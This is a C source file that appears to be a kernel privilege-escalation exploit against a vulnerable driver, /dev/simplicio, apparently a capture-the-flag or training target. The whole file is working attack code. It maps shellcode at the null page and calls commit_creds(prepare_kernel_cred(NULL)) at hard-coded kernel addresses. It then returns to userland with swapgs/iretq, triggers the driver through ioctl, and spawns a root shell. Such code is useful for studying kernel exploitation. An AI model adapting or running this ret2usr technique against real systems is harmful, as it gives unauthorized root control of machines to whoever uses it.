#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <math.h>
#include <sys/mman.h>
#include <stdint.h>

typedef struct state_t
{
    int64_t ss;
    int64_t cs;
    int64_t rflags;
    int64_t rip;
    int64_t rsp;
} state_t;

typedef void *(*prepare_kernel_cred_func_t)(void *daemon);
typedef int (*commit_creds_func_t)(void *new);

#define PREPARE_KERNEL_CRED ((void *)0xffffffff810493c0)
#define COMMIT_CREDS ((void *)0xffffffff81049200)

#define prepare_kernel_cred_func(daemon) \
    (((prepare_kernel_cred_func_t)(PREPARE_KERNEL_CRED))(daemon))

#define commit_creds_func(new) \
    (((commit_creds_func_t)(COMMIT_CREDS))(new))

#define PAGE_SIZE 4096

state_t g_user_state;

void userland_exp()
{
    commit_creds_func(prepare_kernel_cred_func(NULL));

    /* Restore state. */
    __asm__ volatile(
        "pushq %0\n"
        "pushq %1\n"
        "pushq %2\n"
        "pushq %3\n"
        "pushq %4\n"
        "swapgs\n"
        "iretq\n"
        :
        : "r"(g_user_state.ss), "r"(g_user_state.rsp), "r"(g_user_state.rflags), "r"(g_user_state.cs), "r"(g_user_state.rip)
        : "memory");
}

void spawn_shell()
{
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}

void save_state()
{
    __asm__ volatile(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(g_user_state.cs), "=r"(g_user_state.ss), "=r"(g_user_state.rsp), "=r"(g_user_state.rflags)
        :
        : "memory");
    g_user_state.rip = (int64_t)spawn_shell;
}

void copy_ptr(char *dst, void *ptr)
{
    uint64_t ptr_addr;
    *((uint64_t *)dst) = (uint64_t)ptr;
}

int main()
{
    int err, fd;
    char *userland_shellcode;
    uint64_t *ptr_addr;

    save_state();

    fd = open("/dev/simplicio", O_RDWR, 0);
    if (fd < 0)
    {
        perror("[!] open failed");
        return -1;
    }

    /* Allocate memory for a shellcode at 0 address. */
    userland_shellcode = mmap((void *)0, PAGE_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE,
                              MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE | MAP_SHARED, -1, 0);
    if (userland_shellcode == MAP_FAILED)
    {
        perror("[!] mmap failed");
        return -1;
    }

    /* Kernel exploits are hard to write in assembly – make shellcode just invoke a userland funciton. */
    memset(userland_shellcode, 0, PAGE_SIZE);
    userland_shellcode[0] = 0xe8;
    copy_ptr(&userland_shellcode[1], &userland_exp - 5);

    /* Invoke shellcode with some invalid command to trigger userland_shellcode. */
    ioctl(fd, 8, NULL);

    close(fd);
    return 0;
}